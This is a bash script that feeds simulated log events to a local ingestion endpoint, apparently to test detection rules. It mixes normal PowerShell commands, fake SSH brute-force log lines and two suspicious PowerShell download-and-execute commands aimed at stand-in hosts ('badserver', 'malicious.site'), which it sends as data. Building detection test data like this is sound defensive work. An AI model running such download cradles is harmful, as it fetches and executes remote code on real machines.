set -euo pipefail

# Configuration
URL="http://localhost:2021/log/ingest"
ITERATIONS="${1:-0}"  # 0 = infini?
SLEEP_SEC=4

PS_COMMANDS_SUSPICIOUS=(
  "Invoke-WebRequest -Uri http://badserver/script.ps1"
  "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site')"
)
PS_COMMANDS_NORMAL=(
  "Get-Process"
  "Get-Service"
  "Get-ChildItem"
)
BRUTE_FORCE_LINES=(
  "Failed password for invalid user admin from 10.0.0.1 port 55022 ssh2"
  "Failed password for root from 192.168.1.9 port 42211 ssh2"
)
USERS=("jsmith" "admin" "analyst" "guest" "baduser")
HOSTS=("host01" "host02" "host03")

COUNT=0

while [[ "$ITERATIONS" -eq 0 || "$COUNT" -lt "$ITERATIONS" ]]; do
  CATEGORY=$((RANDOM % 3))
  TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

  case $CATEGORY in
    0)
      # Suspicious PowerShell (déclenche mitre_powershell)
      CMD=${PS_COMMANDS_SUSPICIOUS[$RANDOM % ${#PS_COMMANDS_SUSPICIOUS[@]}]}
      TAGS="mitre_powershell"
      ;;
    1)
      # Normal PowerShell (aucun tag MITRE)
      CMD=${PS_COMMANDS_NORMAL[$RANDOM % ${#PS_COMMANDS_NORMAL[@]}]}
      TAGS=""
      ;;
    2)
      # Brute Force Log
      LOG=${BRUTE_FORCE_LINES[$RANDOM % ${#BRUTE_FORCE_LINES[@]}]}
      curl -s -X POST "$URL" -H "Content-Type: application/json" -d "[{\"timestamp\": \"$TIMESTAMP\", \"log\": \"$LOG\"}]" > /dev/null
      echo "Brute force: $LOG"
      sleep "$SLEEP_SEC"
      COUNT=$((COUNT+1))
      continue
      ;;
  esac

  USER=${USERS[$RANDOM % ${#USERS[@]}]}
  HOST=${HOSTS[$RANDOM % ${#HOSTS[@]}]}

  JSON="[{
    \"timestamp\": \"$TIMESTAMP\",
    \"ps_command\": \"$CMD\",
    \"user\": \"$USER\",
    \"host\": \"$HOST\"$( [[ -n "$TAGS" ]] && echo ", \"tags\": \"$TAGS\"" )
  }]"

  echo "PowerShell ($CATEGORY): $CMD by $USER (tags: $TAGS)"
  curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$JSON" > /dev/null

  sleep "$SLEEP_SEC"
  COUNT=$((COUNT+1))
done

echo "Simulation terminée après $COUNT évènements."
